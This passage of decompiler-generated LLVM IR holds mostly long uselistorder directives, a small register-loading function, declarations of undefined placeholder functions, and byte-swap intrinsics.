192, 188, 191, 186, 187, 693, 52, 51, 49, 48, 50, 46, 47, 694, 143, 144, 151, 152, 148, 149, 147, 150, 145, 146, 695, 276, 277, 402, 1014, 103, 106, 104, 105, 696, 223, 222, 697, 328, 698, 303, 304, 1202, 541, 1203, 542, 699, 62, 58, 63, 61, 59, 64, 65, 60, 296, 543, 195, 194, 700, 420, 421, 221, 456, 893, 894, 895, 701, 1085, 704, 703, 702, 241, 705, 465, 987, 466, 988, 989, 457, 990, 382, 383, 381, 384, 385, 388, 387, 386, 991, 1204, 478, 544, 707, 706, 708, 55, 1144, 1147, 1148, 1149, 709, 423, 428, 429, 427, 426, 430, 424, 425, 1150, 1151, 1152, 1153, 710, 435, 441, 434, 440, 439, 433, 443, 442, 437, 431, 436, 432, 438, 1145, 1146, 545, 293, 292, 291, 294, 1137, 546, 1138, 1139, 1140, 1141, 1142, 711, 154, 155, 153, 156, 220, 219, 1154, 1155, 1156, 1157, 1158, 1159, 498, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 548, 1168, 1169, 1170, 1171, 1172, 547, 1173, 1174, 1175, 1176, 1177, 712, 392, 399, 390, 397, 396, 401, 394, 400, 395, 393, 398, 391, 257, 256, 549, 550, 929, 461, 716, 715, 714, 713, 339, 157, 472, 54, 717, 290, 289, 224, 718, 115, 719, 225, 720, 196, 721, 138, 722, 227, 226, 327, 723, 315, 314, 724, 286, 725, 102, 101, 726, 1091, 1092, 44, 45, 896, 897, 898, 899, 900, 901, 902, 1205, 12, 13, 14, 15, 727, 1015, 551, 7, 8, 903, 728, 333, 552, 729, 100, 499, 553, 730, 88, 86, 87, 731, 9, 11, 10, 732, 180, 179, 733, 122, 734, 266, 735, 57, 56, 736, 172, 171, 67, 66, 737, 69, 68, 738, 217, 216, 739, 22, 740, 300, 299, 741, 288, 287, 137, 742, 365, 218, 743, 744, 53, 745, 298, 297, 444, 1178, 389, 1016, 1017, 1018, 1019, 455, 1020, 747, 746, 347, 345, 344, 342, 343, 340, 341, 346, 0, 992, 993, 994, 995, 1093, 473, 1094, 474, 1095, 749, 748, 362, 361, 363, 1021, 1022, 1023, 750, 142, 141, 139, 140, 1179, 1180, 479, 1, 452, 533, 1181, 317, 316, 318, 319, 920, 921, 922, 554, 1024, 422, 1121, 1026, 1025, 1027, 168, 169, 1096, 1112, 751, 332, 331, 330, 329, 1097, 752, 246, 245, 244, 243, 555, 923, 556, 924, 500, 925, 930, 558, 931, 926, 908, 904, 560, 462, 905, 561, 906, 907, 565, 909, 910, 562, 911, 912, 566, 913, 914, 563, 915, 916, 564, 559, 917, 918, 919, 567, 568, 927, 569, 570, 932, 933, 934, 571, 935, 936, 937, 572, 480, 938, 849, 941, 940, 557, 939, 942, 943, 573, 944, 945, 946, 481, 953, 954, 458, 574, 765, 764, 763, 762, 761, 760, 759, 758, 757, 756, 755, 754, 753, 353, 357, 356, 355, 354, 358, 360, 359, 947, 948, 575, 949, 950, 576, 951, 952, 232, 231, 230, 236, 233, 234, 235, 229, 228, 577, 578, 767, 766, 417, 418, 415, 416, 419, 960, 961, 962, 963, 964, 965, 966, 445, 454, 967, 968, 482, 446, 969, 970, 971, 972, 447, 453, 973, 974, 483, 448, 975, 579, 976, 977, 580, 978, 581, 979, 980, 475, 983, 981, 982, 450, 451, 984, 582, 985, 775, 656, 774, 773, 772, 771, 770, 769, 655, 768, 24, 27, 25, 28, 30, 26, 29, 776, 305, 1182, 489, 476, 777, 41, 40, 39, 38, 42, 36, 34, 33, 35, 37, 1098, 779, 778, 126, 127, 125, 124, 123, 128, 928, 23, 502, 955, 585, 956, 501, 957, 583, 584, 586, 958, 959, 587, 588, 589, 590, 591, 592, 593, 791, 790, 789, 788, 787, 786, 785, 784, 783, 659, 782, 781, 780, 16, 17, 19, 18, 594, 459, 595, 792, 596, 597, 598, 601, 600, 599, 986, 794, 793, 349, 348, 350, 602, 996, 490, 997, 998, 603, 492, 604, 999, 605, 1000, 606, 1001, 607, 1002, 608, 1003, 609, 1004, 610, 1005, 611, 1006, 612, 1007, 613, 1008, 614, 1009, 615, 1010, 616, 1011, 460, 617, 808, 807, 806, 805, 804, 803, 802, 801, 800, 799, 798, 797, 796, 795, 116, 117, 118, 121, 119, 120, 1028, 1034, 3, 484, 1029, 618, 1030, 2, 1031, 494, 1032, 485, 486, 1033, 1035, 1036, 495, 1037, 657, 812, 811, 658, 810, 809, 258, 1127, 503, 504, 1128, 4, 5, 6, 1038, 1039, 1040, 619, 1041, 620, 621, 1042, 505, 1043, 813, 198, 202, 203, 204, 201, 197, 200, 199, 1044, 1045, 1046, 622, 1047, 623, 507, 506, 624, 1048, 625, 1049, 814, 94, 97, 98, 99, 96, 91, 95, 92, 93, 1050, 1051, 1052, 1053, 1054, 626, 1055, 627, 1056, 628, 512, 511, 629, 1057, 508, 1058, 509, 1059, 510, 1060, 820, 819, 818, 817, 816, 815, 73, 74, 76, 75, 70, 72, 71, 1061, 1062, 1063, 1064, 1065, 630, 1066, 631, 1067, 632, 521, 520, 633, 1068, 519, 1069, 518, 1070, 513, 1071, 514, 1072, 515, 1073, 516, 1074, 517, 1075, 826, 825, 824, 823, 822, 821, 262, 263, 265, 264, 259, 261, 260, 1099, 1100, 1101, 1102, 1103, 496, 497, 634, 1104, 1105, 635, 1106, 1107, 636, 1108, 1110, 1109, 830, 829, 828, 827, 308, 310, 312, 313, 311, 306, 309, 307, 1113, 1114, 1115, 637, 638, 832, 831, 174, 177, 178, 173, 176, 175, 1116, 1117, 1118, 639, 524, 523, 640, 1119, 522, 1120, 833, 129, 130, 134, 135, 136, 133, 132, 131, 1122, 1123, 1124, 641, 527, 526, 642, 1125, 525, 1126, 838, 837, 836, 835, 834, 77, 78, 83, 84, 85, 82, 81, 80, 79, 1129, 1130, 1131, 643, 1132, 644, 529, 528, 645, 1133, 839, 210, 212, 213, 214, 215, 208, 211, 209, 1134, 1135, 646, 1136, 530, 487, 647, 840, 249, 250, 251, 1183, 1184, 648, 1185, 531, 488, 649, 841, 238, 237, 239, 1143, 532, 650, 842, 158, 159, 160, 1186, 843, 43, 1076, 320, 1077, 1080, 651, 1081, 1082, 1078, 1079, 1083, 1084, 321, 322, 323, 325, 324, 1086, 652, 844, 1111, 107, 845, 846, 326 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16660, { 1, 0 }
}

define i32 @function_1666c() local_unnamed_addr {
entry:
  %v3_16670 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_16670)
  %v31_16678 = load i32, i32* @r0, align 4
  ret i32 %v31_16678

; uselistorder directives
  uselistorder i32* @r0, { 32, 24, 23, 66, 65, 195, 27, 4, 5, 229, 6, 31, 7, 67, 0, 68, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 1, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 69, 25, 63, 64, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 30, 21, 161, 162, 14, 28, 11, 256, 258, 259, 54, 55, 56, 57, 58, 59, 60, 61, 12, 20, 84, 85, 257, 145, 146, 86, 213, 26, 52, 53, 214, 2, 215, 216, 217, 212, 206, 50, 207, 208, 209, 51, 210, 211, 13, 225, 226, 218, 219, 220, 221, 222, 223, 224, 92, 93, 15, 94, 9, 19, 163, 164, 165, 166, 194, 17, 16, 18, 227, 167, 228, 22, 168, 169, 170, 171, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 89, 125, 87, 88, 90, 91, 37, 126, 129, 130, 131, 132, 133, 134, 127, 128, 141, 142, 143, 38, 39, 10, 40, 41, 135, 136, 42, 43, 137, 138, 139, 140, 144, 147, 148, 44, 45, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 46, 159, 160, 47, 172, 173, 174, 175, 176, 177, 178, 8, 179, 180, 181, 182, 183, 184, 185, 203, 204, 3, 186, 187, 188, 189, 190, 191, 196, 197, 198, 199, 200, 201, 202, 205, 192, 193, 48, 49, 29, 62, 34, 36, 33, 35 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 65, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 2, 3, 4, 70, 71, 72, 73, 66, 54, 67, 68, 69, 74, 75, 76, 55, 56, 57, 51, 52, 53, 58, 62, 63, 59, 60, 61, 77, 44, 45, 46, 47, 48, 49, 39, 40, 41, 42, 43, 50, 0, 64 }
  uselistorder i32 0, { 597, 598, 607, 608, 609, 610, 611, 110, 612, 613, 614, 0, 615, 307, 70, 616, 378, 617, 618, 619, 339, 340, 599, 600, 605, 1, 111, 112, 987, 988, 989, 990, 147, 146, 148, 991, 620, 149, 113, 1181, 1182, 1183, 308, 621, 622, 623, 309, 1184, 71, 310, 1185, 1186, 89, 42, 43, 624, 79, 2, 105, 106, 836, 80, 81, 82, 837, 838, 1187, 1188, 1189, 1190, 1191, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1192, 1193, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 33, 1212, 1213, 1214, 1215, 1216, 34, 1217, 1218, 1219, 35, 1220, 1221, 1222, 36, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1247, 1248, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 37, 1266, 1267, 1268, 1269, 1270, 38, 1271, 1272, 1273, 1274, 1275, 39, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 150, 625, 575, 626, 627, 628, 629, 630, 379, 380, 631, 632, 114, 115, 116, 633, 634, 638, 635, 636, 637, 311, 324, 639, 640, 117, 151, 643, 641, 642, 312, 644, 118, 645, 646, 3, 4, 119, 647, 591, 592, 381, 593, 648, 649, 650, 72, 73, 651, 652, 653, 152, 654, 655, 656, 657, 658, 382, 659, 660, 661, 662, 663, 664, 120, 665, 666, 667, 668, 5, 6, 153, 155, 669, 154, 670, 156, 671, 121, 672, 677, 678, 673, 674, 675, 680, 681, 682, 157, 683, 684, 685, 686, 687, 676, 679, 688, 122, 601, 602, 603, 1291, 1292, 1094, 981, 1102, 606, 839, 840, 341, 841, 383, 594, 384, 595, 1103, 1104, 1105, 158, 1106, 842, 843, 844, 596, 604, 123, 159, 1293, 1294, 1107, 1108, 124, 160, 385, 1298, 1299, 386, 1300, 1301, 161, 314, 1302, 1303, 387, 74, 1304, 1305, 388, 1312, 1315, 567, 313, 1316, 389, 1313, 1314, 1295, 1296, 576, 162, 300, 689, 691, 690, 163, 692, 693, 694, 390, 695, 107, 982, 98, 983, 165, 164, 984, 1297, 802, 803, 804, 805, 806, 807, 167, 125, 808, 809, 810, 99, 166, 811, 126, 392, 393, 1307, 391, 127, 574, 128, 168, 1114, 1115, 1116, 1117, 1118, 169, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 170, 1109, 394, 1110, 1111, 395, 1112, 1113, 129, 1095, 396, 171, 1096, 1097, 1098, 1099, 1100, 130, 177, 172, 179, 173, 174, 178, 181, 180, 175, 176, 1126, 1127, 1151, 1152, 131, 1128, 1129, 185, 183, 184, 1130, 1131, 191, 190, 142, 182, 1132, 1133, 1134, 1135, 1136, 1137, 332, 331, 342, 397, 1138, 1139, 1140, 75, 1141, 187, 186, 188, 189, 141, 1142, 1143, 315, 1144, 1145, 108, 1146, 1147, 1148, 1149, 1150, 7, 8, 719, 720, 76, 132, 9, 343, 398, 1153, 1072, 1073, 1154, 950, 721, 812, 722, 723, 1155, 1156, 992, 1317, 1318, 83, 133, 845, 846, 847, 192, 696, 697, 193, 848, 853, 854, 855, 856, 194, 344, 195, 333, 334, 399, 849, 196, 850, 851, 134, 857, 1074, 1308, 724, 725, 726, 852, 1311, 951, 1306, 993, 858, 785, 985, 727, 400, 1309, 102, 1310, 813, 10, 1157, 1158, 103, 1159, 1160, 1161, 1162, 1163, 197, 1164, 568, 577, 569, 570, 1165, 578, 143, 198, 859, 860, 861, 100, 326, 862, 863, 579, 11, 316, 199, 200, 201, 44, 202, 401, 728, 864, 865, 866, 1167, 1166, 1168, 1169, 1170, 1171, 40, 203, 1172, 1173, 1174, 204, 90, 91, 376, 377, 708, 206, 205, 207, 867, 208, 868, 869, 209, 1053, 1054, 402, 210, 870, 211, 212, 1025, 213, 994, 736, 729, 216, 730, 731, 403, 732, 404, 709, 698, 580, 699, 581, 700, 582, 701, 583, 702, 584, 703, 585, 704, 705, 92, 45, 303, 304, 706, 586, 707, 710, 711, 712, 713, 714, 214, 215, 715, 716, 733, 566, 734, 405, 735, 318, 317, 737, 738, 739, 740, 218, 217, 741, 742, 743, 587, 301, 744, 84, 85, 302, 745, 86, 87, 406, 747, 748, 571, 749, 750, 751, 752, 753, 407, 754, 755, 756, 327, 144, 573, 757, 758, 759, 760, 761, 762, 572, 763, 764, 408, 765, 409, 766, 769, 770, 771, 219, 767, 220, 768, 13, 12, 221, 746, 786, 787, 788, 94, 46, 789, 93, 47, 790, 791, 410, 792, 411, 793, 412, 794, 795, 797, 222, 223, 796, 328, 48, 88, 335, 798, 224, 14, 799, 995, 996, 717, 718, 565, 564, 772, 225, 773, 774, 775, 776, 777, 778, 779, 306, 305, 413, 780, 414, 781, 415, 782, 336, 783, 416, 784, 800, 462, 463, 417, 801, 418, 814, 815, 816, 230, 229, 588, 135, 589, 228, 227, 226, 320, 329, 419, 817, 231, 232, 825, 818, 819, 820, 821, 822, 823, 824, 319, 420, 826, 421, 827, 422, 828, 423, 829, 424, 830, 831, 425, 832, 833, 834, 49, 835, 233, 426, 101, 871, 872, 873, 874, 323, 875, 876, 877, 322, 878, 879, 880, 881, 234, 882, 884, 883, 136, 137, 235, 321, 237, 236, 885, 238, 239, 77, 240, 886, 243, 887, 888, 889, 890, 242, 241, 244, 891, 892, 50, 51, 138, 893, 894, 15, 16, 17, 18, 895, 896, 245, 346, 897, 427, 898, 428, 899, 429, 900, 430, 901, 431, 902, 432, 903, 345, 904, 249, 906, 907, 908, 909, 247, 246, 250, 910, 911, 52, 53, 905, 248, 913, 912, 19, 20, 21, 22, 914, 251, 915, 916, 348, 917, 433, 918, 434, 919, 435, 920, 436, 921, 437, 922, 438, 923, 347, 924, 439, 925, 255, 927, 928, 929, 930, 253, 252, 256, 931, 932, 54, 55, 926, 254, 933, 56, 440, 934, 936, 937, 938, 939, 441, 940, 23, 24, 25, 26, 27, 935, 257, 941, 942, 354, 943, 353, 944, 352, 945, 351, 946, 349, 947, 350, 948, 442, 949, 261, 953, 954, 955, 956, 259, 258, 262, 957, 958, 57, 58, 952, 260, 959, 59, 443, 960, 962, 963, 964, 965, 444, 966, 28, 29, 30, 31, 32, 961, 263, 967, 968, 356, 969, 355, 970, 445, 971, 266, 997, 998, 999, 1000, 265, 264, 267, 1001, 1002, 60, 61, 145, 104, 268, 78, 447, 1003, 1004, 1005, 1006, 1007, 269, 1008, 1009, 359, 1010, 1011, 1012, 1013, 273, 270, 271, 272, 1014, 1015, 1016, 1017, 448, 1018, 1019, 358, 1021, 446, 1022, 357, 1023, 449, 1024, 275, 1026, 1027, 1028, 1029, 274, 276, 1030, 1031, 62, 63, 95, 1032, 277, 1033, 1034, 362, 360, 1035, 361, 1036, 1039, 1040, 1041, 279, 280, 1042, 1043, 64, 1037, 1038, 278, 1045, 1044, 1046, 281, 1047, 1048, 365, 1049, 364, 1050, 363, 1051, 450, 1052, 1056, 1057, 1058, 283, 284, 285, 1060, 1061, 65, 1059, 1055, 282, 1063, 1064, 1062, 1065, 286, 1066, 1067, 368, 1068, 367, 1069, 366, 1070, 451, 1071, 290, 1076, 1077, 1078, 1079, 289, 288, 291, 1080, 1081, 66, 67, 1075, 287, 1082, 1083, 292, 1084, 1085, 371, 1086, 370, 1087, 369, 1088, 452, 1089, 454, 96, 68, 1090, 139, 372, 455, 456, 1091, 1092, 293, 294, 1093, 453, 458, 97, 69, 1175, 140, 373, 459, 1176, 1177, 295, 296, 1178, 457, 337, 1101, 1179, 297, 1180, 972, 298, 973, 974, 109, 975, 976, 338, 460, 325, 977, 978, 41, 330, 979, 980, 461, 986, 299, 1020, 374, 590, 375, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333 }
  uselistorder i32* @r4, { 35, 48, 49, 50, 6, 51, 52, 53, 7, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 41, 42, 43, 487, 488, 64, 65, 66, 67, 68, 69, 70, 71, 72, 717, 718, 73, 74, 8, 1, 75, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 9, 76, 77, 78, 79, 80, 81, 82, 83, 84, 10, 85, 86, 89, 90, 91, 92, 36, 93, 94, 95, 96, 97, 98, 87, 88, 37, 38, 99, 100, 11, 101, 12, 102, 13, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 14, 123, 124, 125, 15, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 44, 45, 46, 47, 39, 40, 647, 648, 278, 279, 735, 736, 737, 649, 650, 740, 745, 746, 747, 748, 749, 750, 751, 738, 138, 139, 140, 480, 481, 482, 739, 252, 16, 253, 254, 255, 256, 257, 258, 741, 744, 141, 142, 143, 144, 651, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 17, 668, 669, 670, 671, 652, 653, 654, 655, 615, 616, 617, 618, 619, 620, 621, 622, 623, 18, 624, 625, 626, 627, 628, 629, 630, 631, 632, 672, 694, 695, 696, 697, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 33, 686, 687, 0, 688, 689, 690, 691, 692, 693, 162, 163, 164, 742, 743, 586, 587, 424, 425, 280, 281, 282, 283, 284, 285, 286, 145, 146, 147, 287, 288, 289, 5, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 2, 300, 301, 302, 698, 699, 19, 700, 701, 702, 165, 166, 167, 529, 530, 489, 490, 159, 160, 168, 169, 170, 171, 150, 151, 148, 149, 152, 153, 154, 155, 156, 157, 158, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 188, 189, 190, 191, 198, 199, 200, 3, 201, 192, 193, 194, 195, 196, 197, 186, 187, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 703, 704, 491, 492, 493, 494, 495, 161, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 245, 246, 247, 248, 249, 250, 251, 20, 21, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 303, 304, 4, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 22, 321, 23, 322, 24, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 25, 347, 26, 348, 27, 349, 28, 350, 351, 352, 353, 29, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 30, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 31, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 588, 589, 32, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 705, 706, 707, 708, 709, 710, 714, 715, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 711, 712, 713, 467, 468, 469, 472, 470, 471, 473, 474, 475, 476, 477, 478, 479, 483, 484, 485, 486, 34, 716 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #0

attributes #0 = { nounwind readnone }
